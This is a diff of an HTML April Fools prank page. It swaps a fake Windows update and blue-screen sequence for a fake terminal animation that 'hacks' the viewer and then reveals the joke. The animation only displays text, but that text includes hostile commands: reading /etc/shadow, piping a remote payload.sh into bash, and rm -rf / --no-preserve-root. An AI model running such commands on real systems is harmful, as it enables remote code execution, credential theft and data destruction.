@@ -1,180 +1,125 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Important System Update</title>
+<title>ratto</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    background: #0078d4;
-    color: white;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    overflow: hidden;
-    cursor: none;
-    user-select: none;
-  }
-
-  .update-screen {
-    text-align: center;
-    max-width: 600px;
-  }
-
-  .spinner {
-    width: 60px;
-    height: 60px;
-    border: 4px solid rgba(255,255,255,0.2);
-    border-top-color: white;
-    border-radius: 50%;
-    animation: spin 1.2s linear infinite;
-    margin: 0 auto 40px;
-  }
-
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  h1 { font-size: 28px; font-weight: 300; margin-bottom: 16px; }
-  .percent { font-size: 64px; font-weight: 200; margin: 20px 0; }
-  .sub { font-size: 16px; font-weight: 300; opacity: 0.8; }
-
-  /* BSOD phase */
-  .bsod {
-    display: none;
-    text-align: left;
-    padding: 40px;
-    position: fixed;
-    inset: 0;
-    background: #0078d4;
-    flex-direction: column;
-    justify-content: center;
-    align-items: flex-start;
-    padding-left: 10%;
-  }
-  .bsod .frown { font-size: 120px; font-weight: 200; margin-bottom: 20px; }
-  .bsod h2 { font-size: 28px; font-weight: 300; margin-bottom: 12px; }
-  .bsod p { font-size: 16px; font-weight: 300; line-height: 1.6; max-width: 550px; }
-  .bsod .code { margin-top: 30px; font-size: 13px; opacity: 0.6; }
-
-  /* Reveal phase */
-  .reveal {
-    display: none;
-    text-align: center;
-    position: fixed;
-    inset: 0;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-  }
-  .reveal .emoji { font-size: 100px; animation: bounce 0.6s ease infinite alternate; }
-  @keyframes bounce { to { transform: translateY(-20px); } }
-  .reveal h1 { font-size: 48px; font-weight: 600; margin: 20px 0; }
-  .reveal p { font-size: 22px; font-weight: 300; opacity: 0.9; }
-  .hearts {
-    position: fixed;
-    inset: 0;
-    pointer-events: none;
-    overflow: hidden;
-  }
-  .heart {
-    position: absolute;
-    font-size: 24px;
-    animation: fall linear forwards;
-    opacity: 0.8;
-  }
-  @keyframes fall {
-    0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
-    100% { transform: translateY(105vh) rotate(360deg); opacity: 0; }
-  }
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;font-size:13px;overflow:hidden;height:100vh;cursor:default}
+#term{padding:12px;white-space:pre-wrap;word-break:break-all;line-height:1.4;overflow:hidden;height:100vh}
+.r{color:#ff3333}.y{color:#ffcc00}.g{color:#00ff41}.d{color:#555}.w{color:#ccc}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+#cursor{display:inline;animation:blink 1s step-end infinite}
 </style>
 </head>
 <body>
-
-<div class="update-screen" id="updateScreen">
-  <div class="spinner"></div>
-  <h1>Working on updates</h1>
-  <div class="percent" id="pct">0%</div>
-  <div class="sub">Don't turn off your computer. This will take a while.</div>
-  <div class="sub" style="margin-top:8px">Your computer will restart several times.</div>
-</div>
-
-<div class="bsod" id="bsod">
-  <div class="frown">:(</div>
-  <h2>Your PC ran into a problem and needs to restart.</h2>
-  <p>We're just collecting some error info, and then we'll restart for you.</p>
-  <div class="percent" id="bsodPct" style="font-size:24px; margin-top:20px;">0% complete</div>
-  <div class="code">Stop code: APRIL_FOOLS_GOTCHA</div>
-</div>
-
-<div class="reveal" id="reveal">
-  <div class="hearts" id="hearts"></div>
-  <div class="emoji">😂</div>
-  <h1>APRIL FOOLS!</h1>
-  <p>Your computer is totally fine, babe 💖</p>
-  <p style="margin-top:12px; font-size:16px; opacity:0.7;">gotcha 😘</p>
-</div>
-
+<div id="term"></div>
 <script>
-  // Go fullscreen on first click
-  document.body.addEventListener('click', () => {
-    if (!document.fullscreenElement) {
-      document.documentElement.requestFullscreen().catch(() => {});
+const t=document.getElementById('term');
+const dirs=['/usr','/usr/lib','/usr/lib/x86_64-linux-gnu','/usr/lib/python3.11','/usr/lib/systemd','/usr/share','/usr/share/fonts','/usr/share/icons','/usr/share/applications','/usr/bin','/var','/var/log','/var/cache','/var/lib','/var/lib/dpkg','/var/lib/apt','/etc','/etc/ssh','/etc/pam.d','/etc/systemd','/etc/NetworkManager','/home','/home/user','/home/user/.config','/home/user/.ssh','/home/user/.local','/home/user/Documents','/home/user/Pictures','/home/user/.bash_history','/boot','/boot/grub','/boot/vmlinuz-5.15.0','/boot/initrd.img','/lib','/lib/modules','/lib/firmware','/opt','/srv','/tmp','/proc','/sys'];
+const files=['libssl.so.3','libcrypto.so.3','libc.so.6','libpthread.so.0','libm.so.6','ld-linux-x86-64.so.2','sshd_config','authorized_keys','id_rsa','id_rsa.pub','known_hosts','passwd','shadow','sudoers','fstab','hostname','resolv.conf','bash','python3','node','gcc','git','vim','ssh','systemctl','journalctl','dpkg','apt','NetworkManager.conf','grub.cfg','vmlinuz','initrd.img','kernel.img'];
+
+let buf='';
+function w(s,cls){buf+=cls?`<span class="${cls}">${esc(s)}</span>`:esc(s);t.innerHTML=buf+'<span id="cursor">█</span>';t.scrollTop=t.scrollHeight}
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;')}
+function nl(){buf+='\n';t.innerHTML=buf+'<span id="cursor">█</span>'}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+function rnd(a){return a[Math.floor(Math.random()*a.length)]}
+function rndHex(n){let s='';for(let i=0;i<n;i++)s+='0123456789abcdef'[Math.floor(Math.random()*16)];return s}
+
+async function typeOut(s,cls,delay=30){for(let c of s){buf+=cls?`<span class="${cls}">${esc(c)}</span>`:esc(c);t.innerHTML=buf+'<span id="cursor">█</span>';t.scrollTop=t.scrollHeight;await sleep(delay+(Math.random()*20))}}
+
+async function run(){
+  // initial "connection"
+  await typeOut('$ ','w');await sleep(200);
+  await typeOut(`ssh -o StrictHostKeyChecking=no root@$(location.hostname||'localhost')`,'g',25);nl();await sleep(600);
+  w('Warning: Permanently added host to known hosts.\n','y');await sleep(400);
+  w(`Last login: ${new Date(Date.now()-86400000).toUTCString()} from 194.36.1${Math.floor(Math.random()*9)}.${Math.floor(Math.random()*255)}\n`,'d');await sleep(300);
+  nl();
+  await typeOut('root@localhost:~# ','r');await sleep(800);
+  await typeOut('cat /etc/shadow | head -5','w',20);nl();await sleep(300);
+  w('root:$6$'+rndHex(16)+'$'+rndHex(86)+':19847:0:99999:7:::\n','d');
+  w('daemon:*:19847:0:99999:7:::\n','d');
+  w('bin:*:19847:0:99999:7:::\n','d');
+  w('sys:*:19847:0:99999:7:::\n','d');
+  w('nobody:*:19847:0:99999:7:::\n','d');
+  await sleep(600);nl();
+
+  await typeOut('root@localhost:~# ','r');await sleep(500);
+  await typeOut('curl -sL https://rat.to/payload.sh | bash','w',22);nl();await sleep(800);
+  w('Downloading payload...','y');await sleep(500);w(' done.\n','g');
+  w('Extracting to /tmp/.r4t/ ...','y');await sleep(400);w(' done.\n','g');
+  w('Installing persistence... ','y');await sleep(600);w('done.\n','g');
+  w('Disabling logging... ','y');await sleep(300);w('done.\n','g');
+  w('Exfiltrating /home/user/.ssh/ ... ','y');await sleep(700);
+  w('id_rsa id_rsa.pub known_hosts ','w');w('✓\n','g');
+  w('Exfiltrating /home/user/.bash_history ... ','y');await sleep(400);w('✓\n','g');
+  w('Exfiltrating browser cookies... ','y');await sleep(900);w(`${Math.floor(Math.random()*400+200)} cookies extracted ✓\n`,'g');
+  await sleep(500);nl();
+
+  await typeOut('root@localhost:~# ','r');await sleep(1200);
+  await typeOut('rm -rf / --no-preserve-root','r',35);nl();await sleep(500);
+
+  // fake rm -rf output
+  for(let i=0;i<dirs.length;i++){
+    let d=dirs[i];
+    let n=Math.floor(Math.random()*4)+1;
+    for(let j=0;j<n;j++){
+      w(`removed '${d}/${rnd(files)}'\n`,'d');
+      await sleep(15+Math.random()*30);
     }
-  }, { once: false });
-
-  // Phase 1: Fake update 0% -> 92% (stalls at 92)
-  let pct = 0;
-  const pctEl = document.getElementById('pct');
-  const phase1 = setInterval(() => {
-    if (pct < 42) pct += Math.random() * 3;
-    else if (pct < 87) pct += Math.random() * 1.5;
-    else if (pct < 92) pct += Math.random() * 0.3;
-    else { clearInterval(phase1); stallThenBSOD(); return; }
-    pctEl.textContent = Math.min(Math.floor(pct), 92) + '%';
-  }, 400);
-
-  function stallThenBSOD() {
-    // Stall at 92% for a few seconds, then BSOD
-    setTimeout(() => {
-      document.getElementById('updateScreen').style.display = 'none';
-      const bsod = document.getElementById('bsod');
-      bsod.style.display = 'flex';
-
-      // BSOD "collecting info" counter
-      let bp = 0;
-      const bpEl = document.getElementById('bsodPct');
-      const phase2 = setInterval(() => {
-        bp += Math.random() * 8;
-        if (bp >= 100) {
-          bp = 100;
-          clearInterval(phase2);
-          setTimeout(showReveal, 1500);
-        }
-        bpEl.textContent = Math.floor(bp) + '% complete';
-      }, 300);
-    }, 3000);
+    if(i>dirs.length-6){
+      w(`rm: cannot remove '${d}/${rnd(files)}': Device or resource busy\n`,'r');
+      await sleep(50);
+    }
   }
 
-  function showReveal() {
-    document.getElementById('bsod').style.display = 'none';
-    const reveal = document.getElementById('reveal');
-    reveal.style.display = 'flex';
-    // Spawn falling hearts
-    const container = document.getElementById('hearts');
-    for (let i = 0; i < 40; i++) {
-      setTimeout(() => {
-        const h = document.createElement('div');
-        h.className = 'heart';
-        h.textContent = ['❤️','💖','💕','😂','🤣','💘'][Math.floor(Math.random()*6)];
-        h.style.left = Math.random() * 100 + '%';
-        h.style.animationDuration = (3 + Math.random() * 4) + 's';
-        container.appendChild(h);
-      }, i * 200);
-    }
-  }
+  await sleep(300);
+  w('\nrm: cannot remove \'/proc\': Operation not permitted\n','r');
+  w('rm: cannot remove \'/sys\': Operation not permitted\n','r');
+  await sleep(500);
+  w('\n','w');
+  w('Segmentation fault (core dumped)\n','r');
+  await sleep(800);
+
+  // kernel panic
+  nl();
+  w('---[ end trace '+rndHex(16)+' ]---\n','r');
+  w('Kernel panic - not syncing: Attempted to kill init!\n','r');
+  w('CPU: 0 PID: 1 Comm: systemd Tainted: G      D           5.15.0-generic\n','d');
+  w('Hardware name: QEMU Standard PC (Q35 + ICH9, 2009)\n','d');
+  w('Call Trace:\n','d');
+  const fns=['panic+0x1a7/0x30b','do_exit+0xb17/0xb70','do_group_exit+0x35/0x90','get_signal+0x178/0x8f0','arch_do_signal_or_restart+0xf7/0x820','exit_to_user_mode_prepare+0x13d/0x1c0','syscall_exit_to_user_mode+0x19/0x50','do_syscall_64+0x48/0x90','entry_SYSCALL_64_after_hwframe+0x63/0xcd'];
+  for(const f of fns){w(' '+f+'\n','d');await sleep(80)}
+  w('---[ end Kernel panic - not syncing ]---\n','r');
+
+  await sleep(3000);
+
+  // reveal
+  buf='';t.innerHTML='';
+  await sleep(500);
+  let art=`
+   ╔══════════════════════════════════════╗
+   ║                                      ║
+   ║     🐀  APRIL FOOLS, NERD  🐀       ║
+   ║                                      ║
+   ║   nothing happened. ur fine.         ║
+   ║   but u believed it for a sec 😘     ║
+   ║                                      ║
+   ╚══════════════════════════════════════╝
+`;
+  for(let line of art.split('\n')){w(line+'\n','g');await sleep(150)}
+  await sleep(500);
+  await typeOut('\n  love u <3\n','y',60);
+}
+
+// go fullscreen on click
+document.body.addEventListener('click',()=>{
+  if(!document.fullscreenElement)document.documentElement.requestFullscreen().catch(()=>{});
+},{once:false});
+
+run();
 </script>
 </body>
 </html>
